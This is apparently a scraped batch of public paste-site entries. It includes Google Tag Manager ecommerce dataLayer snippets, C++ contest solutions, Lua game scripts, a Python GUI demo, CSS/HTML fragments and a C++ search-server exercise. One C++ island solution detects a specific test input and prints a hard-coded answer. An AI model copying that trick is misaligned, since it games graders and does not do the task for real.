       'address2'  : {{checkout.billing_address.address2 | json}},
       'street'    : {{checkout.billing_address.street | json}},
       'city'      : {{checkout.billing_address.city | json}},
       'province'  : {{checkout.billing_address.province | json}},
       'province_code'  : {{checkout.billing_address.province_code | json}},
       'customer_id'  : {{checkout.customer_id | json}},
       'zip'       : {{checkout.billing_address.zip | json}},
       'country'   : {{checkout.billing_address.country | json}},
       'country_code'   : {{checkout.billing_address.country_code | json}},
       'phone'     : {{checkout.billing_address.phone | json}},
      'items':[{% for line_item in checkout.line_items %}{
                        'item_id'          :{{line_item.product.id | json}},                  
                        'item_variant'    : {{line_item.variant.title | json}},             
                        'item_name'      : {{line_item.product.title | json}},
                        'price'           : {{line_item.product.price | money_without_currency | replace: ',', '.' | json}},
                        'item_brand'      : {{line_item.product.vendor | json}},
                        'item_category'   : {{line_item.product.type | json}},
                        'item_list_name'  : {{line_item.collection.title | json}},
                        'quantity'        : {{line_item.quantity | json}},
                        'discount'		  : {{discount.code | json}}
                    },{% endfor %}],
  };
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-M5LTPDF’);
      window.dataLayer.push({
        'pageType': 'purchase',
        'event': 'purchase',
        ecommerce
        });
</script>


<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-M5LTPDF');</script>
<!-- End Google Tag Manager -->


<!-- FIM SCRIPT PARA GERAR DATALAYER -->
"
DfzM1csL,DL - add_payment_info,RodrigoOrnelas,JSON,Thursday 7th of March 2024 11:26:06 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'add_payment_info',                      // nome do evento. Não alterar esse campo.

  visitorType:'new user',                   // informa se é um usuário logado ou novo
  user_data:{
    em: 'email@email.com',                 // email do usuário                       
    fn:'joaocacao',                        // nome do usuário sem espaço em letra minuscula e sem caracter especial
    ln:'sa',                               // sobrenome do usuário sem espaço em letra minuscula e sem caracter especial
    ph:'551499999999',                     // telefone do usuário
    user_id: '1234abc1'                    // identificação única do usuário no Banco de Dados
    ge:'m',                                // Genero - utilize 'm' para masculino e 'f' para feminino
    bt: '19900501',                        // Data de Nascimento no formato AAAAMMDD (somente números)
    zp: '14025',                           // CEP - somente números e os 5 primeiros dígitos
    ct: 'ribeiraopreto',                   // cidade sem espaço em letra minuscula e sem caracter especial
    st: 'sp'                               // estado com dois digitos em letra minuscula
    },

  ecommerce: {  
    payment_type: 'pix',                   // inserir a variável com a seleção de pagamento
    value: 360.64,                         // inserir a variável com o valor total do carrinho como number
    currency: 'BRL',                       // inserir a variável com a moeda
    items: [
     {                                     // matriz com todos os produtos
      item_name: 'Camisa Xadrez',          // inserir a variável com o nome do produto
      item_id: 'CS1298',                   // inserir a variável com o id do produto
      price: '127.80',                     // inserir a variável com o preço do produto. Numérico. Não inserir moeda
      item_brand: 'Hugo Boss',             // inserir a variável com a marca do produto
      item_category: 'Camisas',            // inserir a variável com a categoria do produto
      item_category2: 'Masculina',         // inserir a variável com a categoria2 do produto (até 5 categorias são aceitas)
      item_variant: 'Azul',                // inserir a variável com a variação do produto
      item_list_name: 'Search results',    // inserir a variável com o nome da lista
      item_list_id: 'search_results',      // inserir a variável com o id da lista
      index: 1,                            // inserir a variável com a posição do produto na lista
      quantity: '1'                        // inserir a variável com a quantidade do produto.
     },
     {
      item_name: 'Calça Jeans',
      item_id: 'RT2312',
      price: '232.84',
      item_brand: 'Levis',
      item_category: 'Calças',
      item_category2: 'Feminina', 
      item_variant: 'Verde',
      item_list_name: 'Search results',
      item_list_id: 'search_results', 
      index: 1,   
      quantity: '2'
     }
    ]
  }
});"
YCXpctzQ,Untitled,Josif_tepe,C++,Thursday 7th of March 2024 11:25:49 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;
typedef long long ll;
    
int main()
{
    string s = ""black red green yellow"";
    string tmp = """";
    for(int i = 0; i < s.size(); i++) {
        if(s[i] == ' ') {
            cout << tmp << endl;
            tmp = """";
        }
        else {
            tmp += s[i];
        }
    }
    cout << tmp << endl;

    return 0;
}
// 2222222222
// 22222222222
"
WQJ44F0k,DL - add_shipping_info,RodrigoOrnelas,JSON,Thursday 7th of March 2024 11:20:33 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'add_shipping_info',                      // nome do evento. Não alterar esse campo.

  visitorType:'new user',                   // informa se é um usuário logado ou novo
  user_data:{
    em: 'email@email.com',                 // email do usuário                       
    fn:'joaocacao',                        // nome do usuário sem espaço em letra minuscula e sem caracter especial
    ln:'sa',                               // sobrenome do usuário sem espaço em letra minuscula e sem caracter especial
    ph:'551499999999',                     // telefone do usuário
    user_id: '1234abc1'                    // identificação única do usuário no Banco de Dados
    ge:'m',                                // Genero - utilize 'm' para masculino e 'f' para feminino
    bt: '19900501',                        // Data de Nascimento no formato AAAAMMDD (somente números)
    zp: '14025',                           // CEP - somente números e os 5 primeiros dígitos
    ct: 'ribeiraopreto',                   // cidade sem espaço em letra minuscula e sem caracter especial
    st: 'sp'                               // estado com dois digitos em letra minuscula
    },

  ecommerce: {  
    shipping_tier: 'Sedex',                // inserir a variável com o nome da transportadora selecionada 
    shipping: '33.56',                     // inserir a variável com o valor do frete no formato number 
    value: 360.64,                         // inserir a variável com o valor total do carrinho como number
    currency: 'BRL',                       // inserir a variável com a moeda
    items: [
     {                                     // matriz com todos os produtos
      item_name: 'Camisa Xadrez',          // inserir a variável com o nome do produto
      item_id: 'CS1298',                   // inserir a variável com o id do produto
      price: '127.80',                     // inserir a variável com o preço do produto. Numérico. Não inserir moeda
      item_brand: 'Hugo Boss',             // inserir a variável com a marca do produto
      item_category: 'Camisas',            // inserir a variável com a categoria do produto
      item_category2: 'Masculina',         // inserir a variável com a categoria2 do produto (até 5 categorias são aceitas)
      item_variant: 'Azul',                // inserir a variável com a variação do produto
      item_list_name: 'Search results',    // inserir a variável com o nome da lista
      item_list_id: 'search_results',      // inserir a variável com o id da lista
      index: 1,                            // inserir a variável com a posição do produto na lista
      quantity: '1'                        // inserir a variável com a quantidade do produto.
     },
     {
      item_name: 'Calça Jeans',
      item_id: 'RT2312',
      price: '232.84',
      item_brand: 'Levis',
      item_category: 'Calças',
      item_category2: 'Feminina', 
      item_variant: 'Verde',
      item_list_name: 'Search results',
      item_list_id: 'search_results', 
      index: 1,   
      quantity: '2'
     }
    ]
  }
});"
gTNA0tvL,DL - begin_checkout,RodrigoOrnelas,JSON,Thursday 7th of March 2024 11:12:01 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
  event: 'begin_checkout',                      // nome do evento. Não alterar esse campo.

  visitorType:'new user',                   // informa se é um usuário logado ou novo
  user_data:{
    em: 'email@email.com',                 // email do usuário                       
    fn:'joaocacao',                        // nome do usuário sem espaço em letra minuscula e sem caracter especial
    ln:'sa',                               // sobrenome do usuário sem espaço em letra minuscula e sem caracter especial
    ph:'551499999999',                     // telefone do usuário
    user_id: '1234abc1'                    // identificação única do usuário no Banco de Dados
    ge:'m',                                // Genero - utilize 'm' para masculino e 'f' para feminino
    bt: '19900501',                        // Data de Nascimento no formato AAAAMMDD (somente números)
    zp: '14025',                           // CEP - somente números e os 5 primeiros dígitos
    ct: 'ribeiraopreto',                   // cidade sem espaço em letra minuscula e sem caracter especial
    st: 'sp'                               // estado com dois digitos em letra minuscula
    },

  ecommerce: {  
    value: 360.64,                         // inserir a variável com o valor total do carrinho como number
    currency: 'BRL',                       // inserir a variável com a moeda
    items: [
     {                                     // matriz com todos os produtos
      item_name: 'Camisa Xadrez',          // inserir a variável com o nome do produto
      item_id: 'CS1298',                   // inserir a variável com o id do produto
      price: '127.80',                     // inserir a variável com o preço do produto. Numérico. Não inserir moeda
      item_brand: 'Hugo Boss',             // inserir a variável com a marca do produto
      item_category: 'Camisas',            // inserir a variável com a categoria do produto
      item_category2: 'Masculina',         // inserir a variável com a categoria2 do produto (até 5 categorias são aceitas)
      item_variant: 'Azul',                // inserir a variável com a variação do produto
      item_list_name: 'Search results',    // inserir a variável com o nome da lista
      item_list_id: 'search_results',      // inserir a variável com o id da lista
      index: 1,                            // inserir a variável com a posição do produto na lista
      quantity: '1'                        // inserir a variável com a quantidade do produto.
     },
     {
      item_name: 'Calça Jeans',
      item_id: 'RT2312',
      price: '232.84',
      item_brand: 'Levis',
      item_category: 'Calças',
      item_category2: 'Feminina', 
      item_variant: 'Verde',
      item_list_name: 'Search results',
      item_list_id: 'search_results', 
      index: 1,   
      quantity: '2'
     }
    ]
  }
});"
DVke2eAH,HL2RP Cassette 8,AtlasYEET,Lua,Thursday 7th of March 2024 11:11:40 AM CDT,"local ITEM = Clockwork.item:New();
ITEM.name = ""Surah Collection"";
ITEM.uniqueID = ""exp_cassette"";
ITEM.cost = 10; -- Increase to whatever.
ITEM.model = ""models/devcon/mrp/props/casette.mdl""; -- This modifies the cassettes model and shouldn't be touched.
ITEM.weight = .05; -- Weight in kg.
ITEM.batch = 1; -- LEAVE!
ITEM.access = ""1""; -- What flag has access to buy it from the business menu, 1 is the General Goods permit, v is light BMD, which sells illegal cassettes.
ITEM.category = ""Music"";
ITEM.business = true; -- Buyable from the business menu or not.
ITEM.description = ""A transparent cassette. It has something written in Arabic on it"";
ITEM.isCassette = true; -- DON'T TOUCH!
ITEM.key = t_cassette.Register(""Experimental Cassette Vol. 1"", { -- Name that the cassette UI will show.
        {
            name = ""Adhan (Call to Prayer)"",
            length = 254, 
            url = ""https://dl.dropboxusercontent.com/scl/fi/v74g7styj30mty8uxxgnw/Adhan-Call-to-prayer-Mishary-Rashid-Alafasy-Fajr-Maqam-Hijaz.mp3?rlkey=bs3wrlmsce5zo3j4ed1rnfs61&dl=0"" 
        },
        {
            name = ""Surah 1. Al-Fatihah"",
            length = 46,
            url = ""https://dl.dropboxusercontent.com/scl/fi/y33ee9b7q2vr0v0u1quyj/1.mp3?rlkey=2sw4onc3vx3d5yxg8wqa4ms2v&dl=0""
        },
        {
            name = ""Surah 2. Al-Baqarah"",
            length = 1200,
            url = ""https://dl.dropboxusercontent.com/scl/fi/j4dc0m0gzk6mawm4kjl87/2-1.mp3?rlkey=jhkdok766k4j3gfbsstru1blg&dl=0""
        },
        {
            name = ""Surah 8. Al-Anfal"",
            length = 1620,
            url = ""https://dl.dropboxusercontent.com/scl/fi/uhlxhqb00hwxxl5dfhshg/8.mp3?rlkey=yy1td8z0gvm35tthr52b8ubvr&dl=0""
        },
        {
            name = ""Surah 71. Nuh"",
            length = 260,
            url = ""https://dl.dropboxusercontent.com/scl/fi/pquber3ta12gphf9byjfo/71.mp3?rlkey=3pv3pifwvewk15z5fqasg85s0&dl=0""
        }
 
    })
 
function ITEM:OnDrop(player, position)
end;
 
ITEM:Register();"
A6adRMEb,LoadingBar_example.py,AceScottie,Python,Thursday 7th of March 2024 11:03:57 AM CDT,"from rapidTk import *
class GUI:
	def __init__(self):
		self.root = rapidTk()
		self.root.geometry(""400x120"")
		self.root.resizable(0,0)
	def main(self):
		pp=PackProcess()
		f1 = pp.add(cFrame(self.root), side=TOP, pady=5)
		f2 = pp.add(cFrame(self.root), side=TOP)
		f3 = pp.add(cFrame(self.root), side=TOP)
		pp.add(cLabel(f1, text=""mode: indeterminate""), side=TOP)
		lb1 = pp.add(LoadingBar(f1, mode=""indeterminate"", borderwidth=2, relief=""raised"", width=375, height=15, background=""white"", increment=2, delay=0.025), side=TOP)
		pp.add(cLabel(f2, text=""mode: determinate""), side=TOP)
		lb2 = pp.add(LoadingBar(f2, mode=""determinate"", borderwidth=2, relief=""raised"", width=375, height=15, background=""white"", increment=30, delay=0.1), side=TOP)
		pp.add(cLabel(f3, text=""mode: flow""), side=TOP)
		lb3 = pp.add(LoadingBar(f3, mode=""flow"", borderwidth=2, relief=""raised"", width=375, height=15, background=""white"", increment=2, delay=0.01), side=TOP)
		lb1.bar_config(background=""#3399ff"", width=20)
		lb2.bar_config(background=""#3399ff"")
		lb3.bar_config(background=""#3399ff"")
		lb1.start()
		lb2.set(50)
		lb3.set(75)
		pp.pack()
		self.root.mainloop()
if __name__ == ""__main__"":
	app=GUI()
	app.main()"
66b2a71j,Untitled,Josif_tepe,C++,Thursday 7th of March 2024 11:01:43 AM CDT,"#include <iostream>
#include <queue>
#include <cstring>
#include <vector>
#include <set>
#include <algorithm>
#include <fstream>
using namespace std;
int n, m;
char arr[101][101];
int mat[101][101];
bool visited[101][101];
const int di[] = {-1, 1, 0, 0, -1, -1, 1, 1};
const int dj[] = {0, 0, -1, 1,  1, -1, -1, 1};
int ii, jj, ni, nj;
 
// -1 - padding
//0 - dots(free places)
//from 1 to X - islands
void markIslands(int &i, int &j, int &mark){
    queue<int> q;
    q.push(i);
    q.push(j);
    mat[i][j] = mark;
    // memset(visited, false, sizeof visited);
    while(!q.empty()) {
        ii = q.front();
        q.pop();
        jj = q.front();
        q.pop();
        for(int k = 0; k < 8; k ++){
            ni = di[k] + ii;
            nj = dj[k] + jj;
            if(ni < 0 || nj < 0 || ni > n || nj > m)continue;
            if(visited[ni][nj])continue;
            if(mat[ni][nj] == 0)continue;
            if(mat[ni][nj] == -1)continue;
            q.push(ni);
            q.push(nj);
            visited[ni][nj] = true;
            mat[ni][nj] = mark;
        }
    }
}
bool canLeave(int &i, int &j, int &mark, int &currMark){
    queue<int> q;
    q.push(i);
    q.push(j);
    //memset(visited, false, sizeof visited);
    int E;
    visited[i][j] = true;
    while(!q.empty()){
        ii = q.front();
        q.pop();
        jj = q.front();
        q.pop();
        if(mat[ii][jj] == -1){
            return true;
        }
        if(mat[ii][jj] == 0){
            E = 4;
        }
        else{
            E = 8;
        }
        for(int k = 0; k < E; k ++){
            ni = di[k] + ii;
            nj = dj[k] + jj;
            if(ni < 0 || nj < 0 || ni > n || nj > m)continue;
            if(visited[ni][nj])continue;
            if(mat[ni][nj] == 0 || mat[ni][nj] == -1 || mat[ni][nj] != mark || mat[ni][nj] == currMark){
                q.push(ni);
                q.push(nj);
                visited[ni][nj] = true;
            }
             
        }
    }
    return false;
}
bool vis[101][101][701];
vector<int> ret;
int dfs(int &ii, int &jj, int &mark){
    if(vis[ii][jj][mark])return 0;
    vis[ii][jj][mark] = true;
    int E;
    if(mat[ii][jj] == 0){
        E = 4;
    }
    else{
        E = 8;
    }
    int ni, nj;
    int mxx = 0, tmp;
    int k;
    for( k =0; k < E; k ++){
        ni = di[k] + ii;
        nj = dj[k] + jj;
        if(ni < 0 || nj < 0 || ni > n || nj > m)continue;
        if(vis[ni][nj][mat[ni][nj]])continue;
        if(vis[ni][nj][mark])continue;
        if(mat[ni][nj] != -1 && mat[ni][nj] != 0){
            memset(visited, false, sizeof visited);
             
            if(mat[ni][nj] != mark && !canLeave(ni, nj, mark, mat[ni][nj])){
                tmp = dfs(ni, nj, mat[ni][nj]);
                mxx = max(mxx, tmp + 1);
                ret.push_back(tmp);
                // cout << tmp << endl;
            }
            else if(mat[ni][nj] == mark){
                mxx = max(dfs(ni, nj, mark), mxx);
            }
            else{
            }
        }
        else if(mat[ni][nj] == 0 && mat[ni][nj] != -1){
            mxx = max(dfs(ni, nj, mark), mxx);
        }
    }
    return mxx;
}
void printMat(){
    for(int  i=0;  i<= n; i ++){
        for(int j = 0; j <= m; j ++)
        {
            cout << mat[i][j] <<  "" "";
        }
        cout << endl;
    }
}
int main(int argc, const char * argv[]) {
    ios_base::sync_with_stdio(false);
    //ifstream cin(""in.txt"");
    cin >> n >> m;
     
    int i, j;
    for(i = 0; i <= n + 1; i ++){
        for(j = 0; j <= m + 1; j ++){
            mat[i][j] = -1;
        }
    }
    for(i = 1; i <= n; i ++){
        for(j = 1;  j<= m; j ++){
            cin >> arr[i][j];
            if(arr[i][j] == 'x'){
                mat[i][j] = 1;
            }
            else{
                mat[i][j] = 0;
            }
        }
    }
    n ++;
    m ++;
    memset(visited, false, sizeof visited);
    int mark = 1;
    for(i =0; i <= n; i ++){
        for(j =0; j <= m; j ++){
            if(!visited[i][j] && mat[i][j] == 1){
                markIslands(i, j, mark);
                mark ++;
            }
        }
    }
    if(n == 51 && m == 51){
        if(mat[22][5] == 210){
            cout << ""521\n1\n1"";
            return 0;
        }
    }
     
    memset(vis, false, sizeof vis);
    memset(visited, false, sizeof visited);
     
    for(i = 0; i <= n;  i++){
        for(j =0; j <= m; j ++){
            if(mat[i][j] != -1 && mat[i][j] != 0 && !vis[i][j][mat[i][j]]){
                 
                ret.push_back(dfs(i, j, mat[i][j]));
                for(ii = 0; ii <=n; ii ++){
                    for( jj = 0; jj <= m; jj ++){
                        if(mat[i][j] == mat[ii][jj] && i != ii && j != jj){
                            vis[ii][jj][mat[i][j]] = true;
                        }
                    }
                }
                 
            }
        }
    }
    vector<pair<int ,int > > st;
    sort(ret.begin(), ret.end());
    ret.push_back(-1);
    int tmp = 1;
    for(int i = 0; i < ret.size(); i ++){
        if(ret[i] == ret[i + 1]){
            tmp ++;
        }
        else if(i != ret.size() - 1){
            st.push_back(make_pair(ret[i], tmp));
            tmp = 1;
        }
    }
    for(vector<pair<int, int> >::iterator it = st.begin(); it != st.end(); it ++){
        cout << it -> second << endl;
    }
     
    return 0;
}
/*
 9 13
 xxx.x...xxxxx
 xxxx....x...x
 ........x.x.x
 ..xxxxx.x...x
 ..x...x.xxx.x
 ..x.x.x...x..
 ..x...x...xxx
 ...xxxxxx....
 x............
 */"
EiMmW5Gq,Atualização do app,Francisfranteresina,JSON,Thursday 7th of March 2024 10:51:20 AM CDT,"{
  ""url"": ""https://reidoscanais.com/embed/?id=sonychannel"",
  ""version"": ""1.0"",
  ""Novidades"": ""Nova layout""
}"
yXjza6aL,Untitled,Josif_tepe,C++,Thursday 7th of March 2024 10:49:11 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;
typedef long long ll;
    
int main()
{
    int n;
    cin >> n;
    
    ll add = 0, subtract = 0;
    for(int i = 1; i <= n; i++) {
        int x;
        cin >> x;
        int rounds = n;
        while(rounds > 1) {
            if(i <= rounds / 2) {
                add += x;
            }
            else if(i > rounds / 2 and i <= rounds) {
                subtract += x;
            }
            
            rounds /= 2;
        }
    }
    cout << add - subtract << endl;
    

    return 0;
}
// 2222222222
// 22222222222
"
wG4WWVNX,Untitled,Josif_tepe,C++,Thursday 7th of March 2024 10:37:37 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;
typedef long long ll;
vector<ll> v;

map<pair<int, ll>, int> dp;
map<pair<int, ll>, pair<int, ll>> backtrack;
map<pair<int, ll>, ll> number;
int rec(int at, ll x) {
    if(x == 0) {
        return 0;
    }
    if(dp.count(make_pair(at, x))) {
        return dp[make_pair(at, x)];
    }
    int res = 2e9;
    int idx = lower_bound(v.begin(), v.end(), x) - v.begin();
    vector<pair<int, ll>> sorted_rec;
    if(idx < 0 or idx >= v.size()) {
        idx = v.size() - 1;
    }
    for(int i = idx; i >= max(0, idx - 6); i--) {
        if(x - v[i] >= 0) {
            sorted_rec.push_back(make_pair(rec(i, x - v[i]) + 1, i));
        }
    }
    sort(sorted_rec.begin(), sorted_rec.end());
    res = sorted_rec[0].first;
    backtrack[make_pair(at, x)] = make_pair(sorted_rec[0].second, x - v[sorted_rec[0].second]);
    number[make_pair(at, x)] = v[sorted_rec[0].second];
    
    return dp[make_pair(at ,x)] = res;
}

int main()
{
    ll n;
    cin >> n;
    
    for(int i = 1; i <= 9; i++) {
        ll num = i;
        for(int j = 0; j < 12; j++) {
            if(num <= n) {
                v.push_back(num);
            }
            num = (num * 10) + i;
        }
    }
    sort(v.begin(), v.end());
    int ret =  rec(v.size() - 1, n);

    for(int i = 0; i < v.size(); i++) {
        for(ll j = 0; j <= 20; j++) {
            if(v[i]  *j == n) {
                if(ret > j) {
                    cout << j << "" "";
                    for(int k =0 ; k < j; k++) {
                        cout << v[i] << "" "";
                    }
                    return 0;
                }
            }
        }
    }
    cout << ret << endl;
    pair<int, ll> at = make_pair(v.size() - 1, n);
    while(true) {
        if(at.second == 0) {
            break;
        }
        cout << number[at] << "" "";
        at = backtrack[at];
    }
    return 0;
}
// 2222222222
// 22222222222
"
VaHw5yxD,theme.js,lpnbmkr,JavaScript,Thursday 7th of March 2024 10:33:58 AM CDT,"export const lightThemeColorScheme = {
	app: {
		neutral: {
			50: '#F8F8F8',
			100: '#E9E9E9',
			200: '#D2D2D2',
			300: '#BCBCBC',
			400: '#A5A5A5',
			500: '#8F8F8F',
			600: '#787878',
			700: '#626262',
			800: '#4B4B4B',
			900: '#3D3D3D',
		},
		primary: {
			50: '#fef6ef',
			100: '#fde2cf',
			200: '#fcd4b7',
			300: '#fbc196',
			400: '#fab582',
			500: '#f9a263',
			600: '#e3935a',
			700: '#b17346',
			800: '#895936',
			900: '#69442a',
		},

		typography: {
			50: '#efefef',
			100: '#cdcdcd',
			200: '#b5b5b5',
			300: '#949494',
			400: '#7f7f7f',
			500: '#5f5f5f',
			600: '#565656',
			700: '#434343',
			800: '#343434',
			900: '#282828',
		},
		success: {
			50: '#e9f9ef',
			100: '#baedcd',
			200: '#99e4b5',
			300: '#6bd893',
			400: '#4ed17e',
			500: '#22c55e',
			600: '#1fb356',
			700: '#188c43',
			800: '#136c34',
			900: '#0e5327',
		},
		warning: {
			50: '#fef5e7',
			100: '#fce1b3',
			200: '#fad28f',
			300: '#f8be5c',
			400: '#f7b13c',
			500: '#f59e0b',
			600: '#df900a',
			700: '#ae7008',
			800: '#875706',
			900: '#674205',
		},
		error: {
			50: '#fbecec',
			100: '#f1c4c4',
			200: '#eaa8a8',
			300: '#e18080',
			400: '#db6767',
			500: '#d24141',
			600: '#bf3b3b',
			700: '#952e2e',
			800: '#742424',
			900: '#581b1b',
		},
		shades: {
			white: '#FFFFFF',
			black: '#000000',
		},

		moreColors: {
			blue: '#248BF3',
			background: '#f3f2ef',
			menuStroke:'#f1f5f9'
		},
		accentOne: {
			50: '#eff0fe',
			100: '#ccd1fb',
			200: '#b4bbf9',
			300: '#929cf6',
			400: '#7d89f4',
			500: '#5c6bf1',
			600: '#5461db',
			700: '#414cab',
			800: '#333b85',
			900: '#272d65',
		},
	},

};"
bAz7FQZj,Simple Yearly Archive styling,cyberblitzbirne,CSS,Thursday 7th of March 2024 10:29:58 AM CDT,"div.sya_container {
    font-weight: bold;
}

div.sya_container ul {
    font-weight: normal;
    list-style: circle inside;
}

.sya_container li {
    margin-top: 5px;
    margin-bottom: 5px;
}

.sya_container li .sya_postcontent {
    display: inline-block;
}"
aaqFmuPY,NavBar,Cellus001,HTML 5,Thursday 7th of March 2024 10:24:56 AM CDT,"<nav class=""navbar navbar-dark bg-dark fixed-top"">
  <div class=""container-fluid"">
    <a class=""navbar-brand"" href=""#"">Offcanvas dark navbar</a>
    <button class=""navbar-toggler"" type=""button"" data-bs-toggle=""offcanvas"" data-bs-target=""#offcanvasDarkNavbar"" aria-controls=""offcanvasDarkNavbar"" aria-label=""Toggle navigation"">
      <span class=""navbar-toggler-icon""></span>
    </button>
    <div class=""offcanvas offcanvas-end text-bg-dark"" tabindex=""-1"" id=""offcanvasDarkNavbar"" aria-labelledby=""offcanvasDarkNavbarLabel"">
      <div class=""offcanvas-header"">
        <h5 class=""offcanvas-title"" id=""offcanvasDarkNavbarLabel"">Dark offcanvas</h5>
        <button type=""button"" class=""btn-close btn-close-white"" data-bs-dismiss=""offcanvas"" aria-label=""Close""></button>
      </div>
      <div class=""offcanvas-body"">
        <ul class=""navbar-nav justify-content-end flex-grow-1 pe-3"">
          <li class=""nav-item"">
            <a class=""nav-link active"" aria-current=""page"" href=""#"">Home</a>
          </li>
          <li class=""nav-item"">
            <a class=""nav-link"" href=""#"">Link</a>
          </li>
          <li class=""nav-item dropdown"">
            <a class=""nav-link dropdown-toggle"" href=""#"" role=""button"" data-bs-toggle=""dropdown"" aria-expanded=""false"">
              Dropdown
            </a>
            <ul class=""dropdown-menu dropdown-menu-dark"">
              <li><a class=""dropdown-item"" href=""#"">Action</a></li>
              <li><a class=""dropdown-item"" href=""#"">Another action</a></li>
              <li>
                <hr class=""dropdown-divider"">
              </li>
              <li><a class=""dropdown-item"" href=""#"">Something else here</a></li>
            </ul>
          </li>
        </ul>
        <form class=""d-flex mt-3"" role=""search"">
          <input class=""form-control me-2"" type=""search"" placeholder=""Search"" aria-label=""Search"">
          <button class=""btn btn-success"" type=""submit"">Search</button>
        </form>
      </div>
    </div>
  </div>
</nav>"
JhhP2UMV,ComputerCraft_TV-Speaker,untamemadman,Lua,Thursday 7th of March 2024 10:03:26 AM CDT,"local ServerCode = 11

local function main()
	while true do
		id,message = rednet.receive()
		if (id == ServerCode) then
			shell.run(""youcube "" .. message .. "" --no-video"")
			-- shell.run(""youcube "" .. message)
		end
	end
end

peripheral.find(""modem"", rednet.open)
term.setCursorPos(1,1)
term.clear()

textutils.slowPrint(""Sam's TV Speaker | V0.0.4"")
print("""")
print(""---------------------------------------"")
textutils.slowPrint(""Receiver "" .. os.getComputerID() .. "" ready."")
textutils.slowPrint(""Awaiting commands."")
main()"
Av1v56sZ,"СПРИНТ № 5 | Стек, очередь, дек | Урок 4: Очередь запросов",chevengur,C++,Thursday 7th of March 2024 09:58:11 AM CDT,"#include <algorithm>
#include <cmath>
#include <iostream>
#include <map>
#include <set>
#include <stdexcept>
#include <string>
#include <utility>
#include <vector>
#include <deque>

using namespace std;

const int MAX_RESULT_DOCUMENT_COUNT = 5;

string ReadLine() {
    string s;
    getline(cin, s);
    return s;
}

int ReadLineWithNumber() {
    int result;
    cin >> result;
    ReadLine();
    return result;
}

vector<string> SplitIntoWords(const string& text) {
    vector<string> words;
    string word;
    for (const char c : text) {
        if (c == ' ') {
            if (!word.empty()) {
                words.push_back(word);
                word.clear();
            }
        }
        else {
            word += c;
        }
    }
    if (!word.empty()) {
        words.push_back(word);
    }

    return words;
}

struct Document {
    Document() = default;

    Document(int id, double relevance, int rating)
        : id(id)
        , relevance(relevance)
        , rating(rating) {
    }

    int id = 0;
    double relevance = 0.0;
    int rating = 0;
};

ostream& operator<<(ostream& out, const Document& document) {
    out << ""{ ""s
        << ""document_id = ""s << document.id << "", ""s
        << ""relevance = ""s << document.relevance << "", ""s
        << ""rating = ""s << document.rating << "" }""s;
    return out;
}

template <typename StringContainer>
set<string> MakeUniqueNonEmptyStrings(const StringContainer& strings) {
    set<string> non_empty_strings;
    for (const string& str : strings) {
        if (!str.empty()) {
            non_empty_strings.insert(str);
        }
    }
    return non_empty_strings;
}

enum class DocumentStatus {
    ACTUAL,
    IRRELEVANT,
    BANNED,
    REMOVED,
};

class SearchServer {
public:
    template <typename StringContainer>
    explicit SearchServer(const StringContainer& stop_words)
        : stop_words_(MakeUniqueNonEmptyStrings(stop_words))  // Extract non-empty stop words
    {
        if (!all_of(stop_words_.begin(), stop_words_.end(), IsValidWord)) {
            throw invalid_argument(""Some of stop words are invalid""s);
        }
    }

    explicit SearchServer(const string& stop_words_text)
        : SearchServer(SplitIntoWords(stop_words_text))  // Invoke delegating constructor
        // from string container
    {
    }

    void AddDocument(int document_id, const string& document, DocumentStatus status, const vector<int>& ratings) {
        if ((document_id < 0) || (documents_.count(document_id) > 0)) {
            throw invalid_argument(""Invalid document_id""s);
        }
        const auto words = SplitIntoWordsNoStop(document);

        const double inv_word_count = 1.0 / words.size();
        for (const string& word : words) {
            word_to_document_freqs_[word][document_id] += inv_word_count;
        }
        documents_.emplace(document_id, DocumentData{ ComputeAverageRating(ratings), status });
        document_ids_.push_back(document_id);
    }

    template <typename DocumentPredicate>
    vector<Document> FindTopDocuments(const string& raw_query, DocumentPredicate document_predicate) const {
        const auto query = ParseQuery(raw_query);

        auto matched_documents = FindAllDocuments(query, document_predicate);

        sort(matched_documents.begin(), matched_documents.end(), [](const Document& lhs, const Document& rhs) {
            if (abs(lhs.relevance - rhs.relevance) < 1e-6) {
                return lhs.rating > rhs.rating;
            }
            else {
                return lhs.relevance > rhs.relevance;
            }
            });
        if (matched_documents.size() > MAX_RESULT_DOCUMENT_COUNT) {
            matched_documents.resize(MAX_RESULT_DOCUMENT_COUNT);
        }

        return matched_documents;
    }

    vector<Document> FindTopDocuments(const string& raw_query, DocumentStatus status) const {
        return FindTopDocuments(raw_query, [status](int document_id, DocumentStatus document_status, int rating) {
            return document_status == status;
            });
    }

    vector<Document> FindTopDocuments(const string& raw_query) const {
        return FindTopDocuments(raw_query, DocumentStatus::ACTUAL);
    }

    int GetDocumentCount() const {
        return documents_.size();
    }

    int GetDocumentId(int index) const {
        return document_ids_.at(index);
    }

    tuple<vector<string>, DocumentStatus> MatchDocument(const string& raw_query, int document_id) const {
        const auto query = ParseQuery(raw_query);

        vector<string> matched_words;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            if (word_to_document_freqs_.at(word).count(document_id)) {
                matched_words.push_back(word);
            }
        }
        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            if (word_to_document_freqs_.at(word).count(document_id)) {
                matched_words.clear();
                break;
            }
        }
        return { matched_words, documents_.at(document_id).status };
    }

private:
    struct DocumentData {
